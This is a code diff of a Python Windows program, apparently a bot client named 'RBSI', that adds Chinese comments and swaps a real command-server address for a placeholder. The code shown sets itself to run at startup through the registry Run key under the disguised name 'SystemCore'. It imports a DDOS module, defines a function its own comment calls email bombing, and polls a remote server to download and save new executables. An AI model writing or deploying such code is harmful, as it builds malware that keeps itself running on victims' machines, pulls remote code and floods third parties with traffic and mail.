@@ -11,19 +11,22 @@ import zmail
 
 import DDOS
 
+# 全局变量初始化
 version = 1
+url = "http://YOUR_SERVER_HOST:YOUR_SERVER_PORT/"
+
+# 开机启动
 exePath = sys.argv[0]
-url = "http://rbsi.yxzl.top:5001/"
 key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                           "Software\Microsoft\Windows\CurrentVersion\Run", 0,
                           win32con.KEY_WRITE)
 win32api.RegSetValueEx(key, "SystemCore", 0, win32con.REG_SZ, exePath)
 
 
-
 def send_mail(from_address, from_password, to_address,
               title="RBSI发送的问候", content="这是来自RBSI程序发送的问候。",
               from_name="RBSI"):
+    # 邮件轰炸函数
     mail_content = {
         "subject": title,
         "content_html": "<p>%s</p><br /><p>本次发信识别码：%s %s</p>" % (content, random.random(), time.time()),
@@ -39,6 +42,7 @@ def send_mail(from_address, from_password, to_address,
 
 
 def init():
+    # 初始化与服务端的通讯
     global action
     succeed = False
     action = -1
@@ -46,6 +50,7 @@ def init():
         try:
             r = requests.post(url + "init", data={"name": name}).json()
             if r["version"] > version:
+                # 有更新，进行检测
                 print("检查到更新，开始下载...")
                 try:
                     new_version = r["version"]
@@ -55,6 +60,7 @@ def init():
                         -1].split("-")[0] + "-" + str(new_version) + ".exe"
                     with open(exe_name, "wb") as f:
                         f.write(r.content)
+                    # 设置注册表，方便新版本删除旧版本
                     _key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,
                                                r"Software", 0,
                                                win32con.KEY_WRITE)
